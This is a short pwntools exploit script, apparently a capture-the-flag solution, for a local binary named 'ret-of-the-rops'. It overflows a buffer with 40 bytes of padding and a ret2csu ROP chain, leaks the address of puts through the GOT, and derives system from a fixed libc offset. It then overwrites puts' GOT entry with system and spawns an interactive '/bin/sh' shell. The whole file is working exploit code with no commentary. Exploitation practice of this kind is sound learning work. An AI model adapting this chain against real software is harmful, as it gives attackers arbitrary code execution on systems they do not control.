from pwn import *

p = process('./ret-of-the-rops')


gdb.attach(p)

csu_call = 0x401240
csu_ret = 0x40125a
puts_got = 0x404018
gets_got = 0x404028

#rbx
#rbp
#r12
#r13
#r14
#r15
chain = [
        csu_ret,
        0,
        1,
        puts_got,
        0,
        0,
        puts_got,
        csu_call,
        0,
        0,
        1,
        puts_got,
        0,
        0,
        gets_got,
        csu_call,
        0,
        0,
        1,
        puts_got+8,
        0,
        0,
        puts_got,
        csu_call
        ]
chain = ''.join(map(p64,chain))
p.sendlineafter('?\n','a'*40 +chain )

leak = p.readline()[-7:-1]
print leak.encode('hex')
puts = u64(leak.ljust(8,'\x00'))
system = puts-0x2d7a0
print hex(puts)

p.sendline(p64(system)+'/bin/sh\x00')
p.interactive()
